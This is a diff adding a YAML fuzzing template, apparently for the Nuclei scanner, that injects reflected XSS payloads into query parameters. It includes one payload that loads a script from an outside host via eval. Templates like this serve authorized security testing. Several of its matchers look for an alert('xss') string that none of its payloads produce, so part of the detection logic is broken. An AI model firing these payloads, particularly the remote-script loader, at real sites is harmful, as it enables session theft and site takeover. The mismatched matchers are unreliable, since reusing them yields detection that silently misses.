@@ -1,0 +1,53 @@
+id: xss-fuzz-javascript-context
+
+info:
+  name: Combined Reflected XSS Checks via Javascript context injections.
+  author: quas
+  severity: medium
+  description: Fuzzes all query parameters for various reflected XSS vulnerabilities via Javascript context injections.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      xss_payloads:
+        - "\"; alert(1); //"
+        - "\"-alert(document.domain)-\""
+        - "'-alert(document.domain)-'"
+        - "\"; alealertrt(1); //"
+        - "\"-alealertrt(document.domain)-\""
+        - "'-alealertrt(document.domain)-'"
+        - "\"; alealert(1)rt(1); //"
+        - "\"-alalert(1)ert(document.domain)-\""
+        - "'-alealert(1)rt(document.domain)-'"
+        - "'-eval('var a=document.createElement(\'script\');a.src=\'https://q.quas.sh\';document.body.appendChild(a)')-'"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(xss_payloads)}}"
+          - "{{url_encode(url_encode(xss_payloads))}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<script[^>]*>.*\"; alert\\('xss'\\); //.*</script>"
+          - "(?i)<script[^>]*>[^<]*\"[^\"\\\\]*\"-alert\\(document.domain\\)-\"[^<]*</script>"
+          - "(?i)<script[^>]*>[^<]*'[^\"\\\\]*'-alert\\(document.domain\\)-'[^<]*</script>"
+          - "(?i)<script[^>]*>.*'-alert\\(document.domain\\)-'.*</script>"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "(?i)<script[^>]*>.*\\\\\"; alert\\('xss'\\); //.*</script>"
+          - "(?i)<script[^>]*>[^<]*\\\\\"; alert\\('xss'\\); //[^<]*</script>"
+          - "(?i)<script[^>]*>[^<]*\\\\'-alert\\(document.domain\\)-'[^<]*</script>"
+          - "(?i)<script[^>]*>\\s*\\{[^<]*\"[^\"<]*'-alert\\(document.domain\\)-'[^\"<]*\"[^<]*\\}\\s*</script>"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
